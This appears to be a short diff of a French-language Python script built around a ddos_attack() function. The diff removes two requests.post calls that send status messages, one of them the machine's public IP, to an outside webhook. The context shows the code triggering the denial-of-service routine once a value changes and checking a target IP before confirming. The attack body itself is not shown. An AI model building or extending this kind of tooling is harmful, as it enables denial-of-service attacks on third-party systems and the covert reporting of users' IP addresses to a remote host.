@@ -1073,7 +1073,6 @@ def envoyer():
             # Si la valeur a changé et n'est pas vide → action
             if nouvelle_val != "":
                 valeur = nouvelle_val
-                requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                 ddos_attack()
 
     except Exception as e:
@@ -1119,7 +1118,6 @@ def ip():
             ip_cible_nouveau = champ_ip.get("value").strip()
 
             if ip_cible_nouveau != ip_public:
-                requests.post(webhook, json={"content": f"L'ip ne correspond pas à l'IP publique : {ip_public}"})
                 return
 
             confirmer(ip_cible_nouveau)
